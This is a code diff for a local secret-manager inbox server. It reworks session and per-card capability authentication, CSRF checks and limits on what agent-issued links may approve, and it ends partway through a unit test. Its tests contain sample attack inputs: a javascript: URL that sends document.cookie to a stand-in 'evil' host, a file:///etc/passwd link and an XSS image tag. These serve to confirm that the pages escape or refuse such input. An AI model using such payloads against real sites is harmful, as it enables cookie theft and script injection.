@@ -2,9 +2,10 @@
 //! paste, submit. Binds 127.0.0.1 only. Exits after 30 idle minutes with no open tasks.
 //!
 //! Loopback is not authentication — see `crate::inbox_auth` for the threat model. Every route
-//! except `/verify` requires the session token: presented as `?t=` on the first visit, then
-//! held as an `HttpOnly; SameSite=Strict` cookie. POSTs additionally carry it in a hidden form
-//! field (double submit), so a cross-site form post cannot ride the cookie into an answer.
+//! except `/verify` requires a credential: the browser session (full scope) or one card's
+//! capability (that card only), presented as `?t=` on the first visit, then held as an
+//! `HttpOnly; SameSite=Strict` cookie. POSTs additionally carry it in a hidden form field
+//! (double submit), so a cross-site form post cannot ride the cookie into an answer.
 //!
 //! # One request at a time, so nobody may hold the line
 //!
@@ -53,7 +54,7 @@ use std::sync::mpsc::{self, Receiver, RecvTimeoutError};
 use std::sync::{Arc, Mutex};
 use std::time::{Duration, Instant};
 use tokenstash_core::db::{Task, TaskKind, TaskStatus};
-use tokenstash_core::tasks::{self, AnswerResult};
+use tokenstash_core::tasks::{self, Actor, AnswerResult};
 
 #[derive(Args)]
 pub struct InboxArgs {
@@ -89,9 +90,6 @@ const READERS: usize = 8;
 pub fn serve(a: InboxArgs) -> Result<i32> {
     let app = App::open()?;
     let port = a.port.unwrap_or(app.cfg.inbox_port);
-    // Minted here on the first ever start and reused afterwards, so a notification the human
-    // has not clicked yet still opens after the inbox has idled out and been respawned.
-    let tokens = inbox_auth::Tokens::ensure()?;
     let listener = match TcpListener::bind(("127.0.0.1", port)) {
         Ok(l) => l,
         Err(e) => {
@@ -105,6 +103,19 @@ pub fn serve(a: InboxArgs) -> Result<i32> {
         }
     };
     let port = listener.local_addr().map(|l| l.port()).unwrap_or(port);
+    // Only after the bind: the process that owns the port mints the browser session, and a
+    // loser of the bind race above must not invalidate the winner's. Links handed out
+    // before this start (a notification still in the tray) are dead from here on; the
+    // next notification or `tokenstash open` carries the new session. The proof key and
+    // the capability key persist, so the CLI still recognises this inbox and card links
+    // already printed still open their card.
+    let tokens = match inbox_auth::Tokens::start() {
+        Ok(t) => t,
+        Err(e) => {
+            eprintln!("tokenstash: cannot mint the inbox session: {e:#}");
+            return Ok(tokenstash_core::exit::ERROR);
+        }
+    };
     eprintln!("tokenstash inbox → http://127.0.0.1:{port}/");
     let requests = spawn_readers(listener);
     let mut last_activity = Instant::now();
@@ -132,7 +143,6 @@ pub fn serve(a: InboxArgs) -> Result<i32> {
 
 fn handle(app: &App, req: Request, tokens: &inbox_auth::Tokens) -> Result<()> {
     use inbox_auth::Scope;
-    let token = &tokens.full;
     let url = req.url.clone();
     let (path, query) = match url.split_once('?') {
         Some((p, q)) => (p.to_string(), q.to_string()),
@@ -143,12 +153,14 @@ fn handle(app: &App, req: Request, tokens: &inbox_auth::Tokens) -> Result<()> {
 
     // The one unauthenticated route, and deliberately ahead of every other check: it is how a
     // CLI that has not yet decided to trust this listener asks "are you the tokenstash inbox
-    // for my TOKENSTASH_HOME?" without handing over the token to find out. We answer a fresh
-    // nonce with HMAC(token, nonce); a process squatting the port cannot.
+    // for my TOKENSTASH_HOME?" without handing over a credential to find out. We answer a
+    // fresh nonce with HMAC(proof key, nonce); a process squatting the port cannot, and
+    // neither can anyone holding a session or card link captured from a URL — the proof key
+    // never travels.
     if path == "/verify" {
         return match q.get("c") {
             Some(c) if !c.is_empty() && c.len() <= inbox_auth::MAX_CHALLENGE => {
-                respond(req, 200, "text/plain", inbox_auth::verify_response(token, c))
+                respond(req, 200, "text/plain", inbox_auth::verify_response(tokens.proof(), c))
             }
             _ => not_found(req),
         };
@@ -160,10 +172,21 @@ fn handle(app: &App, req: Request, tokens: &inbox_auth::Tokens) -> Result<()> {
         return not_found(req);
     }
 
-    // The cookie value is whichever token the session was opened with; its scope decides
-    // what this request may do. The CSRF field must match the cookie, not merely be valid.
-    let session = cookie(&req, inbox_auth::COOKIE);
-    let scope = session.as_deref().and_then(|c| tokens.scope_of(c));
+    // Two route families, two cookies, and neither reads the other's:
+    //   `/` and `/t/<id>`  the full routes. The session cookie, or `?t=<session>` to set it.
+    //   `/p/<id>`          one card's scoped route. That card's capability cookie (set for
+    //                      this path only), or `?t=<id>.<mac>` to set it.
+    // A full session on a scoped route is not consulted: the card link the agent printed
+    // opens exactly what it was minted for, whoever clicks it, and the person's own login
+    // is neither spent on it nor weakened by it. To act on a card with full authority the
+    // person opens its full route from the index, the notification or `tokenstash open`.
+    let route = match Route::of(&path) { Some(r) => r, None => return not_found(req) };
+    let lookup = |id: &str| app.db.get_task(id).ok().flatten();
+    let presented = cookie(&req, route.cookie_name());
+    // What the cookie proves, on this route: a session is Full; a capability is Task(id)
+    // only when it names the card this path names, verified against that card's row (fetched
+    // by exact id — never a prefix, so nothing resolves an id the caller half knows).
+    let scope = presented.as_deref().and_then(|c| tokens.scope_of(c, lookup)).filter(|s| route.admits(s));
     let cookie_ok = scope.is_some();
     // A body declared over the cap was refused by the reader before a byte of it was read, so
     // there is no form to authenticate with and nothing that could have been stored in part.
@@ -181,123 +204,183 @@ fn handle(app: &App, req: Request, tokens: &inbox_auth::Tokens) -> Result<()> {
     // send it). POST: the cookie AND a matching hidden field — double submit, so even a
     // bypassed or unsupported SameSite cannot turn a cross-site form post into an answer.
     let authed = match method.as_str() {
-        "POST" => cookie_ok && matches!((form.get("t"), session.as_deref()), (Some(t), Some(c)) if inbox_auth::ct_eq(t, c)),
+        "POST" => cookie_ok && matches!((form.get("t"), presented.as_deref()), (Some(t), Some(c)) if inbox_auth::ct_eq(t, c)),
         _ => cookie_ok,
     };
-    // A `?t=` on a GET: the human clicked a link from the chat (paste scope), the
-    // notification or `tokenstash open` (full scope). Swap it for a cookie and bounce to a
-    // clean path so the token stops appearing in the address bar, history, and Referer.
-    // A full-scope cookie is never downgraded by a later paste-scope link: one
-    // `tokenstash open` per browser upgrades every agent link from then on.
+    // A `?t=` on a GET: the human clicked a link from the chat (one card's capability, on
+    // that card's scoped route), the notification or `tokenstash open` (the session, on a
+    // full route). Swap it for the route's cookie and bounce to a clean path so the
+    // credential stops appearing in the address bar, history, and Referer. A credential
+    // that does not fit the route it was presented on — a capability for another card, a
+    // session from before the inbox last restarted, a link minted by an older version — gets
+    // the recovery page whatever cookies the browser holds: an explicit credential that
+    // fails is refused, never papered over by a login in another tab. And a full session
+    // already held is left exactly as it is: a card link never replaces it.
     if method == "GET" {
         if let Some(t) = q.get("t") {
-            if let Some(presented) = tokens.scope_of(t) {
-                // The credential is dropped by its DECODED name — `t=`, `%74=`, repeated — so
-                // no spelling parse_form reads as `t` survives into the Location header; the
-                // rest of the query goes back exactly as it came, nothing re-encoded.
-                let rest = strip_auth_params(&query);
-                let dest = if rest.is_empty() { path.clone() } else { format!("{path}?{rest}") };
-                // A network-path target (`//host`, `/\host`) was refused at parse time; this
-                // is the one place a Location is built from the request, so it is checked
-                // again here rather than trusted from there.
-                if !same_origin_path(&dest) {
-                    return not_found(req);
-                }
-                return match (scope, presented) {
-                    (Some(Scope::Full), _) => redirect(req, &dest),
-                    _ => redirect_authed(req, &dest, tokens.for_scope(presented)),
-                };
+            // The credential is dropped by its DECODED name — `t=`, `%74=`, repeated — so no
+            // spelling parse_form reads as `t` survives into the Location header; the rest
+            // of the query goes back exactly as it came, nothing re-encoded.
+            let rest = strip_auth_params(&query);
+            let dest = if rest.is_empty() { path.clone() } else { format!("{path}?{rest}") };
+            // A network-path target (`//host`, `/\host`) was refused at parse time; this is
+            // the one place a Location is built from the request, so it is checked again
+            // here rather than trusted from there.
+            if !same_origin_path(&dest) {
+                return not_found(req);
             }
+            return match tokens.scope_of(t, lookup).filter(|s| route.admits(s)) {
+                Some(Scope::Full) if scope == Some(Scope::Full) => redirect(req, &dest),
+                Some(Scope::Full) => redirect_authed(req, &dest, inbox_auth::COOKIE, "/", t),
+                Some(Scope::Task(id)) => redirect_authed(req, &dest, inbox_auth::CAP_COOKIE, &format!("/p/{id}"), t),
+                None => page_stale_link(req),
+            };
         }
     }
     if !authed {
         return not_found(req);
     }
-    let scope = scope.unwrap_or(Scope::Paste);
-    // The CSRF hidden field carries the session's own token, so a paste-scope page never
-    // learns the full token.
-    let session_token = tokens.for_scope(scope);
+    let Some(scope) = scope else { return not_found(req) };
+    // The CSRF hidden field carries the session's own credential: the capability on a
+    // scoped page, the session on a full one. A scoped page never learns the session.
+    let session_token = presented.as_deref().unwrap_or_default();
 
     app.db.expire_overdue()?;
 
-    if path == "/" {
-        let list = app.db.list_tasks(None, true)?;
-        let flash = q.get("m").cloned();
-        return respond(req, 200, "text/html; charset=utf-8", page_index(&list, flash.as_deref()));
+    let (task, actor, home) = match (&route, &scope) {
+        (Route::Index, Scope::Full) => {
+            let list = app.db.list_tasks(None, true)?;
+            let flash = q.get("m").cloned();
+            return respond(req, 200, "text/html; charset=utf-8", page_index(&list, flash.as_deref()));
+        }
+        // A person may type a prefix on the full route; an ambiguous one is an error from
+        // the lookup, and to the browser it is a 404, not a dropped connection.
+        (Route::Full(id), Scope::Full) => match app.db.find_task(id) {
+            Ok(Some(t)) => (t, Actor::Human, "/".to_string()),
+            _ => return respond(req, 404, "text/plain", "no such task".into()),
+        },
+        // The scoped route serves one card, by the exact id the capability was verified
+        // against; the cookie carries the card's page as its home, so a reload, a redirect
+        // or a full login in another tab leaves it where it is.
+        (Route::Scoped(id), Scope::Task(own)) if id == own => match app.db.get_task(own)? {
+            Some(t) => (t, Actor::Requester, format!("/p/{own}")),
+            None => return not_found(req),
+        },
+        _ => return not_found(req),
+    };
+    if method == "GET" {
+        return respond(req, 200, "text/html; charset=utf-8", page_task(&task, None, q.get("m").map(String::as_str), session_token, &scope, &app.cfg.env_file));
     }
-    if let Some(id) = path.strip_prefix("/t/") {
-        let id = id.trim_end_matches('/').to_string();
-        // An ambiguous prefix is an error from the lookup; to the browser it is a 404, not a
-        // dropped connection.
-        let Ok(Some(task)) = app.db.find_task(&id) else { return respond(req, 404, "text/plain", "no such task".into()) };
-        if method == "GET" {
-            return respond(req, 200, "text/html; charset=utf-8", page_task(&task, None, session_token, scope, &app.cfg.env_file));
-        }
-        if method == "POST" {
-            let action = form.get("action").cloned().unwrap_or_default();
-            let ctx = app.ctx();
-            let msg: Result<String> = (|| {
-                match (task.kind.clone(), action.as_str()) {
-                    (kind, "deny") => {
-                        // The paste session is not tied to a directory, so from it "deny" on an
-                        // approval card could close another project's pairing for a day.
-                        if kind == TaskKind::Approval && scope != Scope::Full {
-                            anyhow::bail!("closing an approval card needs the full inbox session: click the desktop notification or run `tokenstash open`, then reload this page");
-                        }
-                        tasks::deny(&ctx, &task, form.get("note").map(|s| s.as_str()))?;
-                        Ok(format!("Denied {}", task.title))
+    if method == "POST" {
+        let action = form.get("action").cloned().unwrap_or_default();
+        let ctx = app.ctx();
+        let msg: Result<String> = (|| {
+            match (task.kind.clone(), action.as_str()) {
+                (kind, "deny") => {
+                    // An approval card is the human's decision either way: closing it from
+                    // the agent's link would let the agent bury its own pairing card for a
+                    // day, or another agent's in the same directory.
+                    if kind == TaskKind::Approval && scope != Scope::Full {
+                        anyhow::bail!("closing an approval card needs the full inbox: click the desktop notification or run `tokenstash open`, and decide on this card there (this link stays limited to what it can do)");
                     }
-                    (TaskKind::Secret, _) => {
-                        // A paste other directories will receive (a Replace card; a key they
-                        // hold a grant for) is a decision about them — the agent's link may not
-                        // make it.
-                        if scope != Scope::Full && tasks::fans_out(&ctx, &task)? {
-                            anyhow::bail!("other directories hold this key, so the paste would reach them too: open this card from the desktop notification or run `tokenstash open`");
-                        }
-                        let v = form.get("value").cloned().unwrap_or_default();
-                        let v = v.trim().to_string();
-                        if v.is_empty() { anyhow::bail!("empty value"); }
-                        let skip = form.contains_key("skip_check");
-                        match tasks::answer_secret(&ctx, &task, SecretString::from(v), skip)? {
-                            AnswerResult::Stored { injected_to, rotation, .. } => {
-                                let mut m = format!("Stored {} and wrote it to {}", task.name.clone().unwrap_or_default(), injected_to.map(|p| p.display().to_string()).unwrap_or_else(|| "the stash".into()));
-                                if let Some(r) = rotation {
-                                    if !r.rewritten.is_empty() { m.push_str(&format!("; also updated {} other project(s)", r.rewritten.len())); }
-                                    if !r.skipped.is_empty() { m.push_str(&format!("; {} project(s) STILL HOLD THE OLD VALUE ({}) — fix before revoking it", r.skipped.len(), r.skipped.iter().map(|(p, _)| tokenstash_core::project::short(std::path::Path::new(p))).collect::<Vec<_>>().join(", "))); }
-                                }
-                                Ok(m)
-                            }
-                            _ => Ok("stored".into()),
-                        }
-                    }
-                    (TaskKind::Approval, _) => {
-                        // Approving is the one thing a paste-scope session must not do: it is
-                        // the human's yes to "this project may use my key", and the agent's
-                        // link must not be able to give it. Refuse with no state change.
-                        if scope != Scope::Full {
-                            anyhow::bail!("approving needs the full inbox session: click the desktop notification or run `tokenstash open`, then reload this page");
-                        }
-                        let decision = match action.as_str() { "allow" => tasks::Decision::Allow, "allow_broad" => tasks::Decision::AllowBroad, _ => tasks::Decision::Deny };
-                        // What the page listed when it was rendered: a card that grew since
-                        // (an agent asked for more) is refused and re-read.
-                        // The browser form always carries `seen`; a POST without it (a
-                        // person scripting `curl`) is judged on the card as it is now.
-                        let seen: Option<Vec<String>> = form.get("seen").map(|s| s.split(',').filter(|x| !x.is_empty()).map(String::from).collect());
-                        match tasks::answer_approval(&ctx, &task, decision, seen.as_deref())? {
-                            AnswerResult::Approved { injected, replaced } => Ok(format!("Approved; injected {}{}", if injected.is_empty() { "nothing new".into() } else { injected.join(", ") }, if replaced.is_empty() { String::new() } else { format!(". {} rejected by the provider at delivery — a Replace card is waiting", replaced.join(", ")) })),
-                            _ => Ok("Denied".into()),
-                        }
-                    }
-                    (TaskKind::Human, _) => { tasks::answer_human(&ctx, &task, form.get("note").map(|s| s.as_str()).filter(|s| !s.is_empty()))?; Ok(format!("Done: {}", task.title)) }
+                    tasks::deny(&ctx, &task, form.get("note").map(|s| s.as_str()))?;
+                    Ok(format!("Denied {}", task.title))
                 }
-            })();
-            return match msg {
-                Ok(m) => redirect(req, &format!("/?m={}", urlencoding::encode(&m))),
-                Err(e) => respond(req, 200, "text/html; charset=utf-8", page_task(&task, Some(&format!("{e:#}")), session_token, scope, &app.cfg.env_file)),
-            };
-        }
+                (TaskKind::Secret, _) => {
+                    let v = form.get("value").cloned().unwrap_or_default();
+                    let v = v.trim().to_string();
+                    if v.is_empty() { anyhow::bail!("empty value"); }
+                    let skip = form.contains_key("skip_check");
+                    // A paste other directories will receive (a Replace card; a key they
+                    // hold a grant for) is a decision about them — the agent's link may not
+                    // make it. `answer_secret_by` refuses that for a Requester under the
+                    // index lock, before anything is stored.
+                    match tasks::answer_secret_by(&ctx, actor, &task, SecretString::from(v), skip)? {
+                        AnswerResult::Stored { injected_to, rotation, .. } => {
+                            let mut m = format!("Stored {} and wrote it to {}", task.name.clone().unwrap_or_default(), injected_to.map(|p| p.display().to_string()).unwrap_or_else(|| "the stash".into()));
+                            if let Some(r) = rotation {
+                                if !r.rewritten.is_empty() { m.push_str(&format!("; also updated {} other project(s)", r.rewritten.len())); }
+                                if !r.skipped.is_empty() { m.push_str(&format!("; {} project(s) STILL HOLD THE OLD VALUE ({}) — fix before revoking it", r.skipped.len(), r.skipped.iter().map(|(p, _)| tokenstash_core::project::short(std::path::Path::new(p))).collect::<Vec<_>>().join(", "))); }
+                            }
+                            Ok(m)
+                        }
+                        _ => Ok("stored".into()),
+                    }
+                }
+                (TaskKind::Approval, _) => {
+                    // Approving is the one thing a card session must not do: it is the
+                    // human's yes to "this project may use my key", and the agent's link
+                    // must not be able to give it. Refuse with no state change.
+                    if scope != Scope::Full {
+                        anyhow::bail!("approving needs the full inbox: click the desktop notification or run `tokenstash open`, and approve this card there (this link stays limited to what it can do)");
+                    }
+                    let decision = match action.as_str() { "allow" => tasks::Decision::Allow, "allow_broad" => tasks::Decision::AllowBroad, _ => tasks::Decision::Deny };
+                    // What the page listed when it was rendered: a card that grew since
+                    // (an agent asked for more) is refused and re-read.
+                    // The browser form always carries `seen`; a POST without it (a
+                    // person scripting `curl`) is judged on the card as it is now.
+                    let seen: Option<Vec<String>> = form.get("seen").map(|s| s.split(',').filter(|x| !x.is_empty()).map(String::from).collect());
+                    match tasks::answer_approval(&ctx, &task, decision, seen.as_deref())? {
+                        AnswerResult::Approved { injected, replaced } => Ok(format!("Approved; injected {}{}", if injected.is_empty() { "nothing new".into() } else { injected.join(", ") }, if replaced.is_empty() { String::new() } else { format!(". {} rejected by the provider at delivery — a Replace card is waiting", replaced.join(", ")) })),
+                        _ => Ok("Denied".into()),
+                    }
+                }
+                (TaskKind::Human, _) => { tasks::answer_human(&ctx, &task, form.get("note").map(|s| s.as_str()).filter(|s| !s.is_empty()))?; Ok(format!("Done: {}", task.title)) }
+            }
+        })();
+        return match msg {
+            Ok(m) => redirect(req, &format!("{home}?m={}", urlencoding::encode(&m))),
+            Err(e) => respond(req, 200, "text/html; charset=utf-8", page_task(&task, Some(&format!("{e:#}")), None, session_token, &scope, &app.cfg.env_file)),
+        };
     }
     not_found(req)
+}
+
+/// Which family a path belongs to. Anything else is nothing.
+#[derive(Debug, Clone, PartialEq, Eq)]
+enum Route {
+    Index,
+    /// `/t/<id or prefix>`: full session only.
+    Full(String),
+    /// `/p/<id>`: that card's capability only.
+    Scoped(String),
+}
+
+impl Route {
+    fn of(path: &str) -> Option<Route> {
+        if path == "/" {
+            return Some(Route::Index);
+        }
+        if let Some(id) = path_task_id(path, "/t/") {
+            return Some(Route::Full(id.to_string()));
+        }
+        path_task_id(path, "/p/").map(|id| Route::Scoped(id.to_string()))
+    }
+
+    /// The cookie this route reads. The other one is not looked at.
+    fn cookie_name(&self) -> &'static str {
+        match self {
+            Route::Scoped(_) => inbox_auth::CAP_COOKIE,
+            _ => inbox_auth::COOKIE,
+        }
+    }
+
+    /// Does a verified credential fit this route? The session fits the full routes; a card
+    /// capability fits its own card's scoped route and nothing else.
+    fn admits(&self, scope: &inbox_auth::Scope) -> bool {
+        match (self, scope) {
+            (Route::Index | Route::Full(_), inbox_auth::Scope::Full) => true,
+            (Route::Scoped(id), inbox_auth::Scope::Task(own)) => id == own,
+            _ => false,
+        }
+    }
+}
+
+/// The id a `<prefix><id>` path names, trailing slash tolerated. What it means — a prefix a
+/// person typed, or the one exact card a link opens — is the route's business.
+fn path_task_id<'a>(path: &'a str, prefix: &str) -> Option<&'a str> {
+    let id = path.strip_prefix(prefix)?.trim_end_matches('/');
+    (!id.is_empty() && !id.contains('/')).then_some(id)
 }
 
 /// Anything the caller is not authorised for looks like nothing at all: bare 404, empty body.
@@ -339,11 +422,22 @@ fn respond(req: Request, code: u16, ctype: &str, body: String) -> Result<()> {
         .with("Referrer-Policy", "no-referrer"))
 }
 
-/// 303 that also installs the session cookie. No `Secure` attribute: this is plain HTTP on the
-/// loopback interface and `Secure` would make the browser drop the cookie outright. No
-/// `Max-Age` either — it dies with the browser session.
-fn redirect_authed(req: Request, to: &str, token: &str) -> Result<()> {
-    let set_cookie = format!("{}={token}; Path=/; HttpOnly; SameSite=Strict", inbox_auth::COOKIE);
+/// A `?t=` that authenticates nothing on the inbox that is running now: a notification from
+/// before the last restart, a link an older version minted, a capability re-addressed to a
+/// card it was not minted for. The page says how to get a live link and nothing about
+/// which card, if any, the link named. Still a 404: to a script it is as closed as the
+/// bare one, and `/verify` already tells any local process that an inbox is here.
+fn page_stale_link(req: Request) -> Result<()> {
+    let body = "<div class=err>This link is no longer valid.</div><p>Inbox links stop working when the inbox restarts, and a card's link opens that card only. To continue, click the newest desktop notification, or run <code>tokenstash open</code> in a terminal and use the link it prints.</p><p class=mut>If you did not expect this page, close it: a link that has expired cannot be used to answer anything.</p>";
+    respond(req, 404, "text/html; charset=utf-8", layout("Link expired", body.into()))
+}
+
+/// 303 that also installs a cookie: the session at `Path=/`, or one card's capability at
+/// `Path=/p/<id>` so the browser presents it to that card's route alone. No `Secure`
+/// attribute: this is plain HTTP on the loopback interface and `Secure` would make the
+/// browser drop the cookie outright. No `Max-Age` either — it dies with the browser session.
+fn redirect_authed(req: Request, to: &str, name: &str, cookie_path: &str, token: &str) -> Result<()> {
+    let set_cookie = format!("{name}={token}; Path={cookie_path}; HttpOnly; SameSite=Strict");
     req.respond(Reply::new(303, String::new()).with("Location", local(to)).with("Set-Cookie", set_cookie).with("Cache-Control", "no-store"))
 }
 
@@ -744,10 +838,18 @@ fn csrf_field(token: &str) -> String {
     format!("<input type=hidden name=t value=\"{}\">", esc(token))
 }
 
-fn page_task(t: &Task, err: Option<&str>, token: &str, scope: inbox_auth::Scope, env_file: &str) -> String {
+fn page_task(t: &Task, err: Option<&str>, flash: Option<&str>, token: &str, scope: &inbox_auth::Scope, env_file: &str) -> String {
     let csrf = csrf_field(token);
     let mut b = String::new();
-    b.push_str("<p><a href='/'>← all tasks</a></p>");
+    // A scoped page is one card and nothing around it: no index to go back to.
+    if *scope == inbox_auth::Scope::Full {
+        b.push_str("<p><a href='/'>← all tasks</a></p>");
+    } else {
+        b.push_str("<p class=mut>This link opens this one card. For every task, click the desktop notification or run <code>tokenstash open</code>.</p>");
+    }
+    if let Some(f) = flash {
+        b.push_str(&format!("<div class=flash>✓ {}</div>", esc(f)));
+    }
     if let Some(e) = err {
         b.push_str(&format!("<div class=err>{}</div>", esc(e)));
     }
@@ -775,9 +877,12 @@ fn page_task(t: &Task, err: Option<&str>, token: &str, scope: inbox_auth::Scope,
     match t.kind {
         TaskKind::Secret => {
             b.push_str(&format!(
-                "<form method=post autocomplete=off>{csrf}<label class=mut for=v>{}</label><input id=v type=password name=value autocomplete=off autofocus placeholder='paste here — never shown, never sent anywhere but your keychain'>{}<label class=mut style='display:block;margin-top:8px'><input type=checkbox name=skip_check value=1> skip the provider check (store even if it cannot be verified)</label><div class=row><button class=p type=submit>Store &amp; inject</button><button class=bad name=action value=deny formnovalidate>Decline</button></div></form>",
+                "<form method=post autocomplete=off>{csrf}<label class=mut for=v>{}</label><input id=v type=password name=value autocomplete=off autofocus placeholder='paste here — never shown to the agent'>{}<div class=mut style='margin-top:8px'>What happens to it: {} then it is stored in your keychain and written to <code>{}</code> in the requesting directory{}. The agent reads that file; it never sees the value in chat.</div><label class=mut style='display:block;margin-top:8px'><input type=checkbox name=skip_check value=1> skip the provider check (store even if it cannot be verified)</label><div class=row><button class=p type=submit>Store &amp; inject</button><button class=bad name=action value=deny formnovalidate>Decline</button></div></form>",
                 esc(&t.name.clone().unwrap_or_default()),
-                t.pattern.as_ref().map(|p| format!("<div class=mut>must match <code>{}</code></div>", esc(p))).unwrap_or_default()
+                t.pattern.as_ref().map(|p| format!("<div class=mut>must match <code>{}</code></div>", esc(p))).unwrap_or_default(),
+                if tokenstash_core::registry::lookup(t.name.as_deref().unwrap_or_default()).and_then(|p| p.check.as_ref()).is_some() { "one authenticated request goes to the provider to confirm the key works (unless you skip the check)," } else { "no provider check exists for this name, so it is stored as pasted;" },
+                esc(env_file),
+                if t.expects == tasks::EXPECTS_REPLACE { ", and into every other directory you granted this key" } else { "" }
             ));
         }
         TaskKind::Approval => {
@@ -791,21 +896,25 @@ fn page_task(t: &Task, err: Option<&str>, token: &str, scope: inbox_auth::Scope,
                 format!("<li><code>{}</code>{}{}</li>", esc(n), if identity != "default" { format!(" <span class=mut>@{}</span>", esc(identity)) } else { String::new() }, if sensitive { " <span class=err>sensitive</span>" } else { "" })
             }).collect();
             b.push_str(&format!("<ul>{}</ul>", rows.join("")));
-            if scope == inbox_auth::Scope::Full {
+            if *scope == inbox_auth::Scope::Full {
                 let broad = if t.expects == tasks::APPROVAL_PAIRING {
                     "<button name=action value=allow_broad title='also any registry-confirmed non-sensitive key for this identity, in this directory only'>Allow these + any non-sensitive key here</button>"
                 } else { "" };
                 let seen = esc(&t.names.join(","));
                 b.push_str(&format!("<form method=post>{csrf}<input type=hidden name=seen value='{seen}'><div class=row><button class=p name=action value=allow>Allow these</button>{broad}<button class=bad name=action value=deny>Deny</button></div></form>"));
             } else {
-                b.push_str("<div class=err>Approving needs the full inbox session, which only you can open: click the desktop notification, or run <code>tokenstash open</code> in a terminal, then reload this page. (The link your agent gave you can paste keys, but not approve — so an agent can never approve its own request.)</div>");
+                b.push_str("<div class=err>Approving needs the full inbox session, which only you can open: click the desktop notification, or run <code>tokenstash open</code> in a terminal, and select this card there. This page stays limited to what the link can do, even if you are logged in elsewhere. (The link your agent gave you can paste keys, but not approve — so an agent can never approve its own request.)</div>");
             }
         }
         TaskKind::Human => {
+            // Said before the field, not after: both the answer and the reason for declining
+            // go back to the agent word for word, and the agent's context is not a place for
+            // anything private.
+            b.push_str("<div class=err>Whatever you type below is returned to the agent word for word — as your answer if you press Done, as the reason if you press Can't do this. Do not put a password, a key, or anything private in it; the agent should request secrets with <code>tokenstash need</code>.</div>");
             let note = if t.expects == "text" {
-                "<textarea name=note rows=3 placeholder='your answer'></textarea><div class=mut>This answer is sent back to the agent. Never paste a secret here — the agent should request secrets with <code>tokenstash need</code>.</div>"
+                "<textarea name=note rows=3 placeholder='your answer (sent to the agent)'></textarea>"
             } else {
-                "<input type=text name=note placeholder='optional note (shown to the agent)'>"
+                "<input type=text name=note placeholder='optional note (sent to the agent)'>"
             };
             b.push_str(&format!("<form method=post>{csrf}{note}<div class=row><button class=p name=action value=done>Done</button><button class=bad name=action value=deny>Can't do this</button></div></form>"));
         }
@@ -841,13 +950,13 @@ mod tests {
     #[test]
     fn a_card_link_is_rendered_only_for_http_schemes() {
         for bad in ["javascript:fetch('//evil/'+document.cookie)", "data:text/html,<script>x</script>", "file:///etc/passwd", "JavaScript:alert(1)"] {
-            let page = page_task(&card(Some(bad), "why"), None, "tok", inbox_auth::Scope::Full, ".env.local");
+            let page = page_task(&card(Some(bad), "why"), None, None, "tok", &inbox_auth::Scope::Full, ".env.local");
             assert!(!page.contains("href='javascript"), "{bad}: {page}");
             assert!(!page.to_lowercase().contains("javascript:"), "{bad}");
             assert!(!page.contains("data:text/html"), "{bad}");
             assert!(!page.contains("Open "), "no link button at all for {bad}");
         }
-        let page = page_task(&card(Some("https://platform.openai.com/api-keys"), "why"), None, "tok", inbox_auth::Scope::Full, ".env.local");
+        let page = page_task(&card(Some("https://platform.openai.com/api-keys"), "why"), None, None, "tok", &inbox_auth::Scope::Full, ".env.local");
         assert!(page.contains("href='https://platform.openai.com/api-keys'"), "{page}");
         assert!(page.contains("Open platform.openai.com"), "the host is what the human reads: {page}");
     }
@@ -855,9 +964,63 @@ mod tests {
     /// Agent-written text is escaped wherever it lands on the page.
     #[test]
     fn agent_written_card_text_cannot_become_markup() {
-        let page = page_task(&card(None, "<img src=x onerror=alert(1)>\"'"), None, "tok", inbox_auth::Scope::Full, ".env.local");
+        let page = page_task(&card(None, "<img src=x onerror=alert(1)>\"'"), None, None, "tok", &inbox_auth::Scope::Full, ".env.local");
         assert!(!page.contains("<img src=x"), "{page}");
         assert!(page.contains("&lt;img src=x onerror=alert(1)&gt;"), "{page}");
+    }
+
+    /// `/t/<id>` names one id, exactly; what to do with it is the scope's business.
+    #[test]
+    fn a_task_path_yields_its_id_and_nothing_else() {
+        assert_eq!(path_task_id("/t/t_abc123", "/t/"), Some("t_abc123"));
+        assert_eq!(path_task_id("/t/t_abc123/", "/t/"), Some("t_abc123"));
+        assert_eq!(path_task_id("/t/", "/t/"), None);
+        assert_eq!(path_task_id("/", "/t/"), None);
+        assert_eq!(path_task_id("/tasks/t_abc123", "/t/"), None);
+        assert_eq!(path_task_id("/p/t_abc123/x", "/p/"), None, "nothing below a card");
+        assert_eq!(Route::of("/"), Some(Route::Index));
+        assert_eq!(Route::of("/t/t_abc"), Some(Route::Full("t_abc".into())));
+        assert_eq!(Route::of("/p/t_abc"), Some(Route::Scoped("t_abc".into())));
+        assert_eq!(Route::of("/x"), None);
+    }
+
+    /// The session opens the full routes and nothing scoped; a capability opens its own
+    /// card's scoped route and nothing else — not the full route for the same card, not a
+    /// sibling's scoped route.
+    #[test]
+    fn each_route_admits_exactly_its_own_kind_of_credential() {
+        use inbox_auth::Scope;
+        let full = Scope::Full;
+        let a = Scope::Task("t_aaa".into());
+        assert!(Route::Index.admits(&full) && Route::Full("t_aaa".into()).admits(&full));
+        assert!(!Route::Scoped("t_aaa".into()).admits(&full), "a full session is not consulted on a scoped route");
+        assert!(Route::Scoped("t_aaa".into()).admits(&a));
+        assert!(!Route::Scoped("t_bbb".into()).admits(&a), "a sibling's route");
+        assert!(!Route::Scoped("t_aa".into()).admits(&a) && !Route::Scoped("t_aaaa".into()).admits(&a), "prefix or extension of the id");
+        assert!(!Route::Full("t_aaa".into()).admits(&a) && !Route::Index.admits(&a), "a capability never opens a full route");
+        assert_eq!(Route::Scoped("t_aaa".into()).cookie_name(), inbox_auth::CAP_COOKIE);
+        assert_eq!(Route::Index.cookie_name(), inbox_auth::COOKIE);
+    }
+
+    /// The secret card says where the value goes, and the human card says, before the field,
+    /// that both the answer and the decline reason are returned to the agent.
+    #[test]
+    fn the_cards_say_what_happens_to_what_is_typed() {
+        let page = page_task(&card(None, "why"), None, None, "tok", &inbox_auth::Scope::Task("t_abc123".into()), ".env.local");
+        assert!(page.contains("one authenticated request goes to the provider"), "OPENAI_API_KEY has a registry check: {page}");
+        assert!(page.contains("written to <code>.env.local</code>"), "{page}");
+        assert!(!page.contains("never sent anywhere"), "the old absolute claim is gone: {page}");
+        let mut replace = card(None, "why");
+        replace.expects = tasks::EXPECTS_REPLACE.into();
+        assert!(page_task(&replace, None, None, "tok", &inbox_auth::Scope::Full, ".env.local").contains("every other directory you granted this key"));
+        let mut human = card(None, "why");
+        human.kind = TaskKind::Human;
+        human.expects = "confirm".into();
+        let page = page_task(&human, None, None, "tok", &inbox_auth::Scope::Full, ".env.local");
